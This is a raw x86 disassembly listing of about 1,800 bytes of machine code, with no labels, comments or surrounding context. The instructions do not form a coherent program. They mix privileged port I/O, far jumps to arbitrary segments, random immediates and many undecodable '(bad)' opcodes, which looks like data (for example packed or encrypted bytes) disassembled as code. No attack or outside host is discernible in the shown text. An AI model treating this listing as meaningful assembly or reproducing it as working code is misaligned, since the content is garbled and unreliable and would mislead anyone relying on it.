  41a11f:	mov    eax,0x83f05331
  41a124:	int    0xef
  41a126:	loopne 0x41a152
  41a128:	sub    edi,ebp
  41a12a:	imul   esp,DWORD PTR [bx-0x133c],0xffffff9c
  41a130:	jns    0x41a0cb
  41a132:	fimul  WORD PTR [ebp+0x2c]
  41a135:	mov    al,ds:0x25d3bede
  41a13a:	sbb    eax,0xbfbabf06
  41a13f:	xchg   esp,eax
  41a140:	add    BYTE PTR [edi+0x78e1385a],ah
  41a146:	scas   al,BYTE PTR es:[edi]
  41a147:	mov    bl,0xd4
  41a149:	test   BYTE PTR [edi],ch
  41a14b:	xchg   edx,eax
  41a14c:	sub    al,bl
  41a14e:	mov    ebp,DWORD PTR [esp+edi*8-0x12]
  41a152:	test   ah,cl
  41a154:	adc    eax,0xfcff666c
  41a159:	xlat   BYTE PTR ds:[ebx]
  41a15a:	adc    bh,BYTE PTR [edx+0x12]
  41a15d:	dec    eax
  41a15e:	enter  0xb031,0x20
  41a162:	pop    ds
  41a163:	fld    TBYTE PTR [ecx+ecx*8-0x316f9cb2]
  41a16a:	jbe    0x41a137
  41a16c:	dec    ebp
  41a16d:	dec    edx
  41a16e:	les    ecx,FWORD PTR [bx+si+0x23]
  41a172:	mov    al,0xbc
  41a174:	mov    al,BYTE PTR [edi+0x60]
  41a177:	loope  0x41a1ab
  41a179:	jp     0x41a1f1
  41a17b:	inc    ebp
  41a17c:	cmp    ecx,DWORD PTR [ebp+0x26]
  41a17f:	jmp    0xac77:0x1c103e1d
  41a186:	mov    edi,0xef8e7ac6
  41a18b:	into   
  41a18c:	cmp    DWORD PTR [ecx-0x52],edi
  41a18f:	sub    DWORD PTR [edx],esi
  41a191:	dec    ecx
  41a192:	arpl   ax,bx
  41a194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a195:	cli    
  41a196:	jp     0x41a1e8
  41a198:	fcmovnbe st,st(0)
  41a19a:	sub    DWORD PTR [edx+0xc4a2762],edx
  41a1a0:	mov    cl,0xf1
  41a1a2:	imul   eax,DWORD PTR [esi+0x2ae56e10],0x34
  41a1a9:	push   esp
  41a1aa:	jl     0x41a218
  41a1ac:	out    0x12,al
  41a1ae:	lods   eax,DWORD PTR ds:[esi]
  41a1af:	int3   
  41a1b0:	jmp    0x41a1c3
  41a1b2:	fmul   DWORD PTR [ecx-0x21]
  41a1b5:	cld    
  41a1b6:	push   eax
  41a1b7:	mov    ebx,0x844e846c
  41a1bc:	jns    0x41a1c5
  41a1be:	inc    esp
  41a1bf:	in     eax,0xc6
  41a1c1:	pop    esi
  41a1c2:	pop    ss
  41a1c3:	xor    al,0xdb
  41a1c5:	inc    edx
  41a1c6:	call   0xc16ef2e9
  41a1cb:	mov    al,0xc2
  41a1cd:	pop    edi
  41a1ce:	inc    edi
  41a1cf:	pop    ebx
  41a1d0:	adc    eax,0x3b331733
  41a1d5:	je     0x41a1f3
  41a1d7:	and    eax,0xe2cfbdd6
  41a1dc:	cmc    
  41a1dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1de:	xlat   BYTE PTR ds:[ebx]
  41a1df:	jno    0x41a183
  41a1e1:	fldz   
  41a1e3:	cmp    BYTE PTR [ebp+eiz*4+0x41],0xc6
  41a1e8:	into   
  41a1e9:	add    BYTE PTR [esi],cl
  41a1eb:	loope  0x41a19c
  41a1ed:	sahf   
  41a1ee:	adc    DWORD PTR [edi],edx
  41a1f0:	adc    eax,0x97d858e7
  41a1f5:	dec    ebx
  41a1f6:	hlt    
  41a1f7:	push   0xf0ff5447
  41a1fc:	aad    0x66
  41a1fe:	mov    ?,WORD PTR [edi+0x5192c749]
  41a204:	loop   0x41a24b
  41a206:	and    ebp,edi
  41a208:	inc    edi
  41a209:	mov    ds:0x5330ad9c,al
  41a20e:	inc    ecx
  41a20f:	rcr    DWORD PTR ds:0xeeb33970,1
  41a215:	clc    
  41a216:	sahf   
  41a217:	xor    edx,esi
  41a219:	jns    0x41a1de
  41a21b:	sub    al,0x39
  41a21d:	mov    ecx,0xfb118d05
  41a222:	mov    BYTE PTR [edi+0x63978c4a],bh
  41a228:	mov    bh,cl
  41a22a:	les    eax,FWORD PTR [ecx]
  41a22c:	pop    ds
  41a22d:	push   0x8c0d33b7
  41a232:	(bad)  
  41a233:	addr16 cmc 
  41a235:	cli    
  41a236:	jns    0x41a1be
  41a238:	aaa    
  41a239:	in     al,dx
  41a23a:	add    al,0xa9
  41a23c:	sbb    ah,BYTE PTR [eax+0x78]
  41a23f:	mov    esi,0x6639e245
  41a244:	mov    WORD PTR [ebx+0x616d95a1],gs
  41a24a:	out    0x55,eax
  41a24c:	and    ah,bh
  41a24e:	sub    BYTE PTR [eax-0x5379cb54],al
  41a254:	mov    bl,0xeb
  41a256:	lahf   
  41a257:	jg     0x41a231
  41a259:	loop   0x41a255
  41a25b:	add    bl,ah
  41a25d:	xchg   BYTE PTR [esi+0x711e8507],al
  41a263:	div    BYTE PTR [ebp+0x52]
  41a266:	xchg   ebx,eax
  41a267:	outs   dx,DWORD PTR ds:[esi]
  41a268:	mov    dh,0x16
  41a26a:	addr16 jg 0x41a290
  41a26d:	fnstsw WORD PTR [ebx-0x78102bbb]
  41a273:	push   eax
  41a274:	mov    edx,0x5539db9d
  41a279:	(bad)  
  41a27a:	in     al,0xdc
  41a27c:	test   BYTE PTR [ebx],bh
  41a27e:	test   al,0xe8
  41a280:	ins    DWORD PTR es:[edi],dx
  41a281:	pop    ebx
  41a282:	mov    al,0x12
  41a284:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a285:	push   ds
  41a286:	cmp    dh,cl
  41a288:	in     al,dx
  41a289:	lahf   
  41a28a:	jns    0x41a2a3
  41a28c:	mov    BYTE PTR [edx+0x335dc565],0x4e
  41a293:	das    
  41a294:	imul   eax,DWORD PTR [ebp+0x20838e4e],0x12fe11d7
  41a29e:	inc    edx
  41a29f:	(bad)
  41a2a3:	(bad)  
  41a2a4:	sub    DWORD PTR [eax-0x3e881442],esi
  41a2aa:	addr16 mov dh,0xe9
  41a2ad:	(bad)  
  41a2ae:	mov    dh,0xec
  41a2b0:	and    eax,ebx
  41a2b2:	or     dl,bl
  41a2b4:	xchg   ebp,eax
  41a2b5:	mov    bl,0x9a
  41a2b7:	sbb    BYTE PTR [edi+0x39],dl
  41a2ba:	fwait
  41a2bb:	loopne 0x41a285
  41a2bd:	cmc    
  41a2be:	clc    
  41a2bf:	out    dx,al
  41a2c0:	stos   BYTE PTR es:[edi],al
  41a2c1:	push   edx
  41a2c2:	fmul   QWORD PTR [eax-0x6abb7a19]
  41a2c8:	push   ss
  41a2c9:	hlt    
  41a2ca:	mov    cl,0x9
  41a2cc:	ffree  st(2)
  41a2ce:	repz arpl WORD PTR [edx],bx
  41a2d1:	mov    eax,0x4e74924f
  41a2d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2d7:	retf   
  41a2d8:	dec    esi
  41a2d9:	retf   
  41a2da:	push   edx
  41a2db:	xor    DWORD PTR [edi],edi
  41a2dd:	ss sti 
  41a2df:	lea    edi,[edi-0x4222d802]
  41a2e5:	jmp    0x81df:0x9a117d66
  41a2ec:	ja     0x41a2d7
  41a2ee:	loope  0x41a2ab
  41a2f0:	mov    ds:0x81535bd0,eax
  41a2f5:	dec    eax
  41a2f6:	fild   DWORD PTR [eax+0x277b2698]
  41a2fc:	xchg   ebp,eax
  41a2fd:	cld    
  41a2fe:	leave  
  41a2ff:	je     0x41a372
  41a301:	loopne 0x41a2cf
  41a303:	jb     0x41a329
  41a305:	push   es
  41a306:	or     esp,esp
  41a308:	bound  esp,QWORD PTR [ebx+0x9a3096a]
  41a30e:	xchg   esi,eax
  41a30f:	sub    eax,0xdff0caf3
  41a314:	pop    ebx
  41a315:	xchg   BYTE PTR [ebx+0x3a7042b7],bl
  41a31b:	jl     0x41a2d7
  41a31d:	test   eax,0xf13e3165
  41a322:	out    0x9a,eax
  41a324:	cmp    dh,BYTE PTR [ebx-0x19]
  41a327:	add    dh,BYTE PTR [ebx-0x80]
  41a32a:	pop    ebp
  41a32b:	jnp    0x41a2eb
  41a32d:	int    0x57
  41a32f:	ret    0xac6c
  41a332:	adc    esp,edi
  41a334:	addr16 cdq 
  41a336:	repz popf 
  41a338:	outs   dx,DWORD PTR ds:[esi]
  41a339:	add    ebp,DWORD PTR [ebx-0x41]
  41a33c:	es int3 
  41a33e:	fidiv  WORD PTR [edx]
  41a340:	fsubrp st(7),st
  41a342:	mov    ds:0xa3d00922,eax
  41a347:	mov    ecx,0x74fb6853
  41a34c:	das    
  41a34d:	sbb    DWORD PTR [edx+0x19],ebp
  41a350:	jg     0x41a3cc
  41a352:	and    al,0xab
  41a354:	(bad)  
  41a355:	xchg   esp,eax
  41a356:	rcr    BYTE PTR [edi+0x68],0xb9
  41a35a:	out    0xa7,eax
  41a35c:	loopne 0x41a37c
  41a35e:	xchg   edx,eax
  41a35f:	pop    esp
  41a360:	arpl   WORD PTR [ebp+edi*2+0x6e],bp
  41a364:	adc    eax,0x27b50441
  41a369:	outs   dx,DWORD PTR ds:[esi]
  41a36a:	adc    eax,0x563215df
  41a36f:	add    BYTE PTR [edx+0x39],0x1a
  41a373:	loop   0x41a385
  41a375:	ds and al,0xd9
  41a378:	cmp    ebx,eax
  41a37a:	push   0x1c6f191e
  41a37f:	stos   BYTE PTR es:[edi],al
  41a380:	xchg   esp,eax
  41a381:	outs   dx,DWORD PTR ds:[esi]
  41a382:	pop    ds
  41a383:	pop    ds
  41a384:	pop    ebx
  41a385:	jle    0x41a35c
  41a387:	inc    edx
  41a388:	cmc    
  41a389:	mov    al,ds:0x4d21941e
  41a38e:	mov    al,0x2e
  41a390:	add    edi,0x4bf3be55
  41a396:	or     ah,ah
  41a398:	jge    0x41a3df
  41a39a:	mul    DWORD PTR [ecx+0x19390aa2]
  41a3a0:	jno    0x41a382
  41a3a2:	push   ebp
  41a3a3:	sbb    DWORD PTR [edi],edx
  41a3a5:	cmp    ah,BYTE PTR [ecx-0x53f48bf8]
  41a3ab:	pop    edx
  41a3ac:	or     BYTE PTR [si],0xbf
  41a3b0:	repz sbb al,0x2b
  41a3b3:	cmp    DWORD PTR [ecx-0x432c40c4],edi
  41a3b9:	int    0xf2
  41a3bb:	retf   
  41a3bc:	les    ebx,FWORD PTR [esi]
  41a3be:	sbb    al,0x6e
  41a3c0:	lea    esi,[edx-0x7cdf6a2f]
  41a3c6:	out    dx,eax
  41a3c7:	in     al,0x88
  41a3c9:	jle    0x41a3ab
  41a3cb:	ins    BYTE PTR es:[edi],dx
  41a3cc:	call   FWORD PTR [ebx-0x28]
  41a3cf:	jmp    0x41a389
  41a3d1:	xchg   ebp,eax
  41a3d2:	jnp    0x41a3f1
  41a3d4:	and    DWORD PTR [eax],esi
  41a3d6:	lea    esp,[eax]
  41a3d8:	fnstenv [edx-0x32]
  41a3db:	retf   
  41a3dc:	int3   
  41a3dd:	je     0x41a389
  41a3df:	xchg   esp,eax
  41a3e0:	push   cs
  41a3e1:	mov    cl,0x10
  41a3e3:	(bad)  
  41a3e5:	div    ebp
  41a3e7:	jno    0x41a3bd
  41a3e9:	lods   al,BYTE PTR ds:[esi]
  41a3ea:	pop    ebx
  41a3eb:	lahf   
  41a3ec:	outs   dx,DWORD PTR ds:[esi]
  41a3ed:	xchg   edi,eax
  41a3ee:	call   0x30c5:0x848169f0
  41a3f5:	sub    esp,DWORD PTR [esi+0x2c]
  41a3f8:	cdq    
  41a3f9:	cs popa 
  41a3fb:	mov    edi,0x31dbb7fd
  41a400:	cdq    
  41a401:	ds jmp 0xeb38a768
  41a407:	lock out dx,al
  41a409:	and    edx,DWORD PTR [edx]
  41a40b:	mov    bh,0xb7
  41a40d:	jno    0x41a3a0
  41a40f:	xchg   ecx,eax
  41a410:	inc    edx
  41a411:	loope  0x41a48b
  41a413:	xor    bl,BYTE PTR [ebp-0x71558e99]
  41a419:	fadd   DWORD PTR [bp+di+0x6f]
  41a41d:	jg     0x41a425
  41a41f:	sbb    DWORD PTR [esi+0xe],ebp
  41a422:	ja     0x41a3ce
  41a424:	or     DWORD PTR [edx+0xd],0xfffffff0
  41a428:	push   esp
  41a429:	pop    edx
  41a42a:	popf   
  41a42b:	dec    esi
  41a42c:	cwde   
  41a42d:	cdq    
  41a42e:	dec    ebp
  41a42f:	push   0x3f
  41a431:	mov    ah,0xd2
  41a433:	lock cwde 
  41a435:	inc    eax
  41a437:	or     ecx,DWORD PTR [ecx*8-0x6372cd56]
  41a43e:	xchg   DWORD PTR [ecx+0x1f],esp
  41a441:	outs   dx,BYTE PTR ds:[esi]
  41a442:	pop    es
  41a443:	dec    esp
  41a444:	retf   0x54ad
  41a447:	rol    DWORD PTR [ebx-0x58],1
  41a44a:	cmp    bl,BYTE PTR [ebp-0x1b]
  41a44d:	test   cl,dh
  41a44f:	je     0x41a486
  41a451:	xor    ebx,DWORD PTR [edx]
  41a453:	jb     0x41a478
  41a455:	mov    ecx,0x7d574650
  41a45a:	inc    ecx
  41a45b:	xchg   BYTE PTR [esi],dh
  41a45d:	mov    edx,0xe09a0b61
  41a462:	or     DWORD PTR [ebp+0x5c7a6186],eax
  41a468:	add    al,0x62
  41a46a:	xor    ah,BYTE PTR [eax+0x5612c29a]
  41a470:	push   eax
  41a471:	adc    eax,0x5cfb2721
  41a476:	fsub   st,st(5)
  41a478:	out    0x4,eax
  41a47a:	inc    ecx
  41a47b:	mov    al,ds:0x87bd36b6
  41a480:	fadd   DWORD PTR [edx-0x34133f89]
  41a486:	push   ss
  41a487:	lods   al,BYTE PTR ds:[esi]
  41a488:	in     eax,0x46
  41a48a:	scas   eax,DWORD PTR es:[edi]
  41a48b:	mov    esi,0xeadf7c0b
  41a490:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a491:	stos   DWORD PTR es:[edi],eax
  41a492:	xchg   DWORD PTR [edi+0x44],edx
  41a495:	xchg   BYTE PTR [esi-0x79726ab6],bl
  41a49b:	mov    bh,0x91
  41a49d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a49e:	stos   BYTE PTR es:[edi],al
  41a49f:	arpl   bx,dx
  41a4a1:	fld    QWORD PTR [esi+0x7fe343e4]
  41a4a7:	and    al,0x17
  41a4a9:	in     eax,dx
  41a4aa:	adc    BYTE PTR [ebp+0x24d8489d],bl
  41a4b0:	mov    ah,0xe8
  41a4b2:	test   BYTE PTR [esi],al
  41a4b4:	dec    eax
  41a4b5:	ficom  WORD PTR [edx+0x1c699870]
  41a4bb:	mov    esi,0xc0df04ee
  41a4c0:	jle    0x41a536
  41a4c2:	imul   ebx,ecx,0xffffffaa
  41a4c5:	jno    0x41a467
  41a4c7:	add    ch,BYTE PTR [edi+0x427224fe]
  41a4cd:	push   edx
  41a4ce:	hlt    
  41a4cf:	add    DWORD PTR [eax-0x15],ecx
  41a4d2:	inc    ebp
  41a4d3:	mov    dh,0x68
  41a4d5:	xor    eax,0x91bbbbc0
  41a4da:	push   ds
  41a4db:	xchg   edx,eax
  41a4dc:	sbb    al,0x4d
  41a4de:	xchg   ebx,eax
  41a4df:	sbb    ebx,DWORD PTR [eax-0x356e58ff]
  41a4e5:	std    
  41a4e6:	popa   
  41a4e7:	xchg   ecx,eax
  41a4e8:	jl     0x41a4b8
  41a4ea:	add    BYTE PTR [ebx],cl
  41a4ec:	in     al,dx
  41a4ed:	aam    0xd9
  41a4ef:	dec    esi
  41a4f0:	pusha  
  41a4f1:	test   al,0x69
  41a4f3:	sub    ch,ch
  41a4f5:	fcomp  QWORD PTR [ecx+eiz*1+0x196446a4]
  41a4fc:	pop    ebp
  41a4fd:	push   esi
  41a4fe:	push   esp
  41a4ff:	xchg   cl,bl
  41a501:	cli    
  41a502:	inc    ebx
  41a503:	adc    al,BYTE PTR [esi+0x2]
  41a506:	adc    eax,0x1fdc6629
  41a50b:	js     0x41a4db
  41a50d:	repz frndint 
  41a510:	fcom   st(2)
  41a512:	push   ecx
  41a513:	jg     0x41a538
  41a515:	das    
  41a516:	pop    edi
  41a517:	dec    eax
  41a518:	add    DWORD PTR [ebx+0x16869cbc],0x7f
  41a51f:	and    bl,BYTE PTR [esi-0x26ed18eb]
  41a525:	mov    eax,0x7b11c415
  41a52a:	mov    esi,fs
  41a52c:	jl     0x41a560
  41a52e:	push   cs
  41a52f:	ss scas eax,DWORD PTR es:[edi]
  41a531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a532:	int3   
  41a533:	jl     0x41a537
  41a535:	bound  ebx,QWORD PTR [eax+eax*8]
  41a538:	push   cs
  41a539:	dec    edx
  41a53a:	jno    0x41a516
  41a53c:	jne    0x41a5a2
  41a53e:	xor    eax,0xae5ca461
  41a543:	dec    ah
  41a545:	inc    ebp
  41a546:	jg     0x41a555
  41a548:	jp     0x41a558
  41a54a:	xor    dh,BYTE PTR [ecx+0x22c48eb5]
  41a550:	int3   
  41a551:	dec    edi
  41a552:	cmp    al,0x60
  41a554:	icebp  
  41a555:	in     al,dx
  41a556:	loop   0x41a5c0
  41a558:	maskmovq mm3,(bad)
  41a559:	neg    DWORD PTR [eax]
  41a55b:	adc    ecx,0xfffffff0
  41a55e:	(bad)  [edi-0x74bbf92b]
  41a564:	and    eax,0xb8f9e5d5
  41a569:	xor    DWORD PTR [ebp+ebx*4+0x26390c83],edi
  41a570:	(bad)  
  41a571:	shl    DWORD PTR [ecx+0x57],1
  41a574:	sar    DWORD PTR [edi+edx*4+0x1d926b55],1
  41a57b:	xor    BYTE PTR [edx],bh
  41a57d:	xchg   edx,eax
  41a57e:	bound  esp,QWORD PTR [eax+0xc29c1cf]
  41a584:	out    dx,al
  41a585:	jmp    0xf8a2456a
  41a58a:	sbb    cl,bl
  41a58c:	mov    edi,0x40c8d99d
  41a591:	js     0x41a5db
  41a593:	in     al,0xb7
  41a595:	leave  
  41a596:	pop    edx
  41a597:	xchg   ebx,eax
  41a598:	mov    edi,0x1d410bf1
  41a59d:	jae    0x41a602
  41a59f:	push   esp
  41a5a0:	xor    dh,BYTE PTR [ecx+0x101ae87f]
  41a5a6:	cmp    dh,BYTE PTR [esi-0xf347b97]
  41a5ac:	ret    0x5cb8
  41a5af:	push   edi
  41a5b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a5b1:	lods   al,BYTE PTR ds:[esi]
  41a5b2:	mov    ch,0x69
  41a5b4:	inc    ebx
  41a5b5:	fcomp  DWORD PTR [eax+0x4d]
  41a5b8:	sti    
  41a5b9:	repnz sbb BYTE PTR [ebx],cl
  41a5bc:	sbb    al,0xd4
  41a5be:	sub    eax,0x4e37d8de
  41a5c3:	popa   
  41a5c4:	mov    esi,0x64717598
  41a5c9:	das    
  41a5ca:	jmp    0x6d3b:0x47f32260
  41a5d1:	stos   DWORD PTR es:[edi],eax
  41a5d2:	clc    
  41a5d3:	pusha  
  41a5d4:	lock cli 
  41a5d6:	xor    eax,0x1fc0a21b
  41a5db:	lods   al,BYTE PTR ds:[esi]
  41a5dc:	fcmovnbe st,st(1)
  41a5de:	inc    ebp
  41a5df:	mov    al,0x60
  41a5e1:	adc    dl,BYTE PTR [ecx-0x6fb347de]
  41a5e7:	pop    esi
  41a5e8:	out    dx,eax
  41a5e9:	jmp    0x41a5d3
  41a5eb:	push   ebx
  41a5ec:	adc    ebp,DWORD PTR [edi+esi*8-0xf0f5ece]
  41a5f3:	cmc    
  41a5f4:	(bad)  
  41a5f5:	clc    
  41a5f6:	push   0x78
  41a5f8:	aas    
  41a5f9:	cwde   
  41a5fa:	sub    al,0xcf
  41a5fc:	pop    ebp
  41a5fd:	adc    eax,0x929f89c5
  41a602:	xlat   BYTE PTR ds:[ebx]
  41a603:	dec    esp
  41a604:	dec    eax
  41a605:	das    
  41a606:	fdiv   st(2),st
  41a608:	retf   
  41a609:	aas    
  41a60a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a60b:	adc    DWORD PTR [ebx+0x27e481b3],0x45
  41a612:	mov    ds:0xb3bdf40b,al
  41a617:	cli    
  41a618:	xchg   esi,eax
  41a619:	or     DWORD PTR [eax+ebp*4-0x18239538],0x49126aee
  41a624:	xor    eax,0x56f94b39
  41a629:	sbb    bl,BYTE PTR [eax]
  41a62b:	fnsave [edi]
  41a62d:	or     dl,BYTE PTR [ebp+0x43]
  41a630:	add    ecx,DWORD PTR [edi]
  41a632:	leave  
  41a633:	pop    edx
  41a634:	iret   
  41a635:	ror    DWORD PTR [ebx-0x63],0xfb
  41a639:	push   cs
  41a63a:	push   eax
  41a63b:	mov    eax,ds:0x8b325d6f
  41a640:	push   ebp
  41a641:	cmp    ebx,DWORD PTR [ecx-0x65e42562]
  41a647:	mov    es,ebx
  41a649:	mov    BYTE PTR [eax],dl
  41a64b:	xlat   BYTE PTR ds:[ebx]
  41a64c:	ret    0xa2e1
  41a64f:	arpl   bx,di
  41a651:	add    DWORD PTR [edx],edi
  41a653:	(bad)  
  41a654:	xlat   BYTE PTR ds:[ebx]
  41a655:	jecxz  0x41a687
  41a657:	mul    dl
  41a659:	inc    esi
  41a65a:	or     BYTE PTR [ebp+0x57],ch
  41a65d:	dec    edi
  41a65e:	sub    DWORD PTR [edi],esp
  41a660:	fwait
  41a661:	popf   
  41a662:	pop    ebp
  41a663:	jge    0x41a65e
  41a665:	iretw  
  41a667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a668:	cmc    
  41a669:	mov    BYTE PTR [ebp-0x34],dl
  41a66c:	push   edi
  41a66d:	repz enter 0x5135,0x1a
  41a672:	cs in  eax,0x17
  41a675:	outs   dx,BYTE PTR ds:[esi]
  41a676:	adc    eax,0x297e1dc
  41a67b:	fs jo  0x41a6ba
  41a67e:	popa   
  41a67f:	lahf   
  41a680:	ret    
  41a681:	mov    dh,0x46
  41a683:	mov    bh,BYTE PTR [ebx]
  41a685:	or     dl,BYTE PTR [edi]
  41a687:	clc    
  41a688:	and    bl,dh
  41a68a:	pop    edi
  41a68b:	nop
  41a68c:	outs   dx,DWORD PTR ds:[esi]
  41a68d:	mov    cl,0x8d
  41a68f:	into   
  41a690:	inc    eax
  41a691:	dec    edx
  41a692:	test   eax,0xc64b2552
  41a697:	(bad)  
  41a698:	aas    
  41a699:	stos   BYTE PTR es:[edi],al
  41a69a:	lock xchg edi,eax
  41a69c:	aam    0x54
  41a69e:	ficomp DWORD PTR [eax+edx*4-0x2984f961]
  41a6a5:	push   ecx
  41a6a6:	bound  ecx,QWORD PTR [edi+0x4d]
  41a6a9:	inc    eax
  41a6aa:	pop    ds
  41a6ab:	int    0x5f
  41a6ad:	jnp    0x41a652
  41a6af:	push   ecx
  41a6b0:	test   BYTE PTR [esi],bh
  41a6b2:	or     BYTE PTR [ecx-0x4],dl
  41a6b5:	xor    DWORD PTR [edi],edx
  41a6b7:	ret    
  41a6b8:	dec    edx
  41a6b9:	hlt    
  41a6ba:	lahf   
  41a6bb:	xchg   edi,eax
  41a6bc:	jmp    0x41a642
  41a6be:	shl    esi,cl
  41a6c0:	jl     0x41a73b
  41a6c2:	mov    ds:0xee63da92,al
  41a6c7:	add    edi,DWORD PTR [esp+eax*4+0x74]
  41a6cb:	arpl   sp,si
  41a6cd:	jo     0x41a6c1
  41a6cf:	in     eax,0xc5
  41a6d1:	mov    edi,0x3147afb9
  41a6d6:	imul   esp,DWORD PTR [ebx+0x64097951],0xffffffa3
  41a6dd:	xor    esp,DWORD PTR [esi]
  41a6df:	es scas al,BYTE PTR es:[edi]
  41a6e1:	cmp    eax,0x5020f06f
  41a6e6:	mov    esp,eax
  41a6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6e9:	add    esp,DWORD PTR [edi]
  41a6eb:	mov    al,ah
  41a6ed:	sar    BYTE PTR [edi+ecx*1+0x45],1
  41a6f1:	push   ds
  41a6f2:	push   ss
  41a6f3:	pop    DWORD PTR [esi-0x1aa6da20]
  41a6f9:	enter  0x9411,0x71
  41a6fd:	push   edi
  41a6fe:	push   ebx
  41a6ff:	jb     0x41a6eb
  41a701:	(bad)  
  41a702:	(bad)  
  41a703:	iret   
  41a704:	jno    0x41a6ae
  41a706:	mov    ebx,0xbeba4be2
  41a70b:	xor    eax,0x283a615b
  41a710:	outs   dx,BYTE PTR ds:[esi]
  41a711:	dec    edi
  41a712:	sub    al,0xc7
  41a714:	pop    ds
  41a715:	mov    ah,0xe4
  41a717:	inc    esi
  41a718:	mov    ch,0x53
  41a71a:	call   0x7b079e77
  41a71f:	sahf   
  41a720:	xchg   edi,eax
  41a721:	icebp  
  41a722:	fldcw  WORD PTR [ebp-0x12acb41d]
  41a728:	mov    ah,0xb6
  41a72a:	scas   al,BYTE PTR es:[edi]
  41a72b:	ret    
  41a72c:	jne    0x41a74f
  41a72e:	(bad)  
  41a72f:	div    BYTE PTR [esi+edx*8+0x4e]
  41a733:	sbb    BYTE PTR [eax-0x5],dh
  41a736:	lods   eax,DWORD PTR ds:[esi]
  41a737:	scas   al,BYTE PTR es:[edi]
  41a738:	dec    eax
  41a739:	jle    0x41a729
  41a73b:	jb     0x41a73b
  41a73d:	inc    ecx
  41a73e:	outs   dx,BYTE PTR ds:[esi]
  41a73f:	mov    eax,ds:0xe8e21982
  41a744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a745:	jae    0x41a6c8
  41a747:	scas   eax,DWORD PTR es:[edi]
  41a748:	adc    al,0x7c
  41a74a:	repnz add DWORD PTR [edi+0x7d3c62ea],esi
  41a751:	sub    ecx,ebx
  41a753:	push   ebp
  41a754:	iret   
  41a755:	data16 add BYTE PTR [eax+0x7b],0x1c
  41a75a:	or     BYTE PTR [esi-0x4d],dh
  41a75d:	int    0x8a
  41a75f:	popa   
  41a760:	mov    es,eax
  41a762:	aam    0x1b
  41a764:	dec    edi
  41a765:	and    al,0xa4
  41a767:	dec    ebp
  41a768:	cld    
  41a769:	int    0x88
  41a76b:	sbb    BYTE PTR [ebp+0x4614431a],bh
  41a771:	jecxz  0x41a7c5
  41a773:	jg     0x41a728
  41a775:	mov    esi,DWORD PTR [ebp+0x3f]
  41a778:	push   0xffffffc3
  41a77a:	mov    eax,0x1f18bd5f
  41a77f:	or     edx,DWORD PTR [ebx]
  41a781:	fs push ds
  41a783:	int    0x49
  41a785:	in     al,0xe4
  41a787:	add    dl,ah
  41a789:	fwait
  41a78a:	or     eax,0x74dcb5a
  41a78f:	fsub   DWORD PTR [ecx+0x5c]
  41a792:	mov    al,ds:0xa0baf53e
  41a797:	jle    0x41a752
  41a799:	or     ebp,DWORD PTR [ecx-0x3e]
  41a79c:	lods   al,BYTE PTR ds:[esi]
  41a79d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a79e:	aas    
  41a79f:	push   es
  41a7a0:	lahf   
  41a7a1:	xchg   DWORD PTR [edi],ebp
  41a7a3:	(bad)  
  41a7a5:	cmp    al,dh
  41a7a7:	adc    al,0x33
  41a7a9:	cmp    DWORD PTR [ebx+0x56b5ced3],ebx
  41a7af:	xor    al,0xa2
  41a7b1:	and    eax,0x14cda6cb
  41a7b6:	or     al,0xe
  41a7b8:	add    eax,0xe83b7126
  41a7bd:	adc    bl,BYTE PTR [edx+0x6966f4f9]
  41a7c3:	icebp  
  41a7c4:	lahf   
  41a7c5:	ins    BYTE PTR es:[edi],dx
  41a7c6:	xor    DWORD PTR [esi-0x4362f2e8],ebp
  41a7cc:	ds jns 0x41a7d9
  41a7cf:	sbb    DWORD PTR [ecx+0x6ff89f46],edx
  41a7d5:	sbb    dh,BYTE PTR [edx+0x77a7044c]
  41a7db:	jne    0x41a75d
  41a7dd:	sahf   
  41a7de:	inc    esp
  41a7df:	xor    edi,esp
  41a7e1:	add    dl,BYTE PTR [ebx]
  41a7e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7e4:	enter  0x23f8,0xaf
  41a7e8:	dec    ebp
  41a7e9:	jge    0x41a78b
  41a7eb:	cli    
  41a7ec:	mov    eax,0x6b7b41b1
  41a7f1:	int3   
  41a7f2:	xchg   ebp,eax
  41a7f3:	idiv   DWORD PTR [ecx-0x37]
  41a7f6:	add    BYTE PTR [edi-0x6db17c7c],ch
  41a7fc:	xchg   ecx,eax
  41a7fd:	pop    ecx
  41a7fe:	icebp  
  41a7ff:	rcl    BYTE PTR [edx-0x41],cl
  41a802:	arpl   WORD PTR [ebx+0x2b4d2d4a],sp
  41a808:	les    eax,FWORD PTR [ebp+0x6d1bb323]
  41a80e:	sub    cl,ah
  41a810:	xor    edx,DWORD PTR [ebp-0x2b]
  41a813:	add    eax,0xc3a596e8
  41a818:	pop    ebx
  41a819:	xchg   ecx,eax
  41a81a:	int    0x9c
  41a81c:	dec    ebx
  41a81d:	jle    0x41a7dc
  41a81f:	or     al,0xea
  41a821:	mov    eax,0x1d788b52
  41a826:	int3   
  41a827:	push   ss
  41a828:	fwait
  41a829:	cwde   
  41a82a:	xchg   DWORD PTR [edx-0x301ae381],ebx
  41a830:	ss out dx,al
  41a832:	ret    
  41a833:	addr16 dec esp
  41a835:	mov    esi,0x65a918f9
  41a83a:	fwait
  41a83b:	loopne 0x41a816
  41a83d:	sti    
  41a83e:	add    al,0xa3
  41a840:	ror    ah,1
  41a842:	cdq    
  41a843:	mov    ebp,DWORD PTR ds:[ecx+0x1337387d]
  41a84a:	push   ds
  41a84b:	mov    al,ds:0xbb8424a9
  41a850:	xchg   ebx,eax
  41a851:	je     0x41a81e
  41a853:	int3   
  41a854:	mov    ebp,0x30a9ce0d
  41a859:	sub    al,0x1f
  41a85b:	int    0xe6
  41a85d:	daa    
  41a85e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
